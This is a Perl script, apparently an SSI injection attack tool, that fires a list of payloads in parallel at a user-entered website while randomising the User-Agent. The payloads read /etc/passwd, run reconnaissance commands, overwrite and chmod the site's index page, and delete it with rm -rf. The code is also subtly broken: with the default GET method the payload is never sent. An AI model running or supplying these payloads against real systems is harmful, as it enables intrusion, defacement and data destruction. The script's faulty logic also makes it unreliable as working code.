#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use Parallel::ForkManager;

# Function to send HTTP request with payload
sub send_request {
    my ($url, $method, $payload, $headers) = @_;
    my $ua = LWP::UserAgent->new;
    $ua->timeout(10);  # Set timeout to 10 seconds
    $ua->agent("Mozilla/".int(rand(100))."." . int(rand(1000)) . " (compatible; MSIE ".int(rand(10)).".0; Windows NT ".int(rand(10))."." . int(rand(10))."; .NET CLR 1.1.".int(rand(1000)).")");  # Randomize User-Agent
    my $request;
    if ($method eq 'GET') {
        $request = HTTP::Request->new(GET => $url);
    } elsif ($method eq 'POST') {
        $request = HTTP::Request->new(POST => $url, $headers, $payload);
    } elsif ($method eq 'PUT') {
        $request = HTTP::Request->new(PUT => $url, $headers, $payload);
    } else {
        die "Invalid HTTP method specified\n";
    }
    my $response = $ua->request($request);
    my $content = $response->decoded_content;
    if ($response->is_success) {
        if ($content =~ /<!--#/) {
            print "Potential SSI Injection detected on $url\n";
            print "Response Content:\n$content\n";
        } else {
            print "No SSI Injection detected on $url\n";
        }
    } else {
        print "Error executing request on $url: ", $response->status_line, "\n";
    }
}

# Prompt user for target website URL
print "Enter your target website URL: ";
my $target_url = <STDIN>;
chomp $target_url;

# HTTP method to use (GET, POST, PUT)
my $method = 'GET';

# Payloads to test for SSI Injection
my @payloads = (
    "<!--#echo var=\"DOCUMENT_URI\" -->",
    "<!--#echo var=\"DATE_LOCAL\" -->",
    "<!--#include virtual=\"/etc/passwd\" -->",
    "<!--#exec cmd=\"ls -la\" -->",
    "<!--#exec cmd=\"cat /etc/passwd\" -->",
    "<!--#exec cmd=\"uname -a\" -->",
    "<!--#exec cmd=\"id\" -->",
    "<!--#exec cmd=\"whoami\" -->",
    "<!--#exec cmd=\"ps aux\" -->",
    "<!--#exec cmd=\"netstat -an\" -->",
    "<!--#exec cmd=\"ls -al /tmp\" -->",
    "<!--#exec cmd=\"find /var/www -type f -name '*.php'\" -->",
    "<!--#config errmsg=\"Access denied, please login!\" -->",
    "<!--#exec cmd=\"echo '<h1>SSI Test</h1>' > /var/www/html/index.html\" -->",
    "<!--#exec cmd=\"chmod 777 /var/www/html/index.html\" -->",
    "<!--#exec cmd=\"rm -rf /var/www/html/index.html\" -->",
    # Add more payloads as needed
);

# Set up parallel processing
my $pm = Parallel::ForkManager->new(10);  # 10 parallel processes
foreach my $payload (@payloads) {
    $pm->start and next;  # Fork
    send_request($target_url, $method, $payload, {});
    $pm->finish;  # End parallel process
}
$pm->wait_all_children;  # Wait for all parallel processes to finish
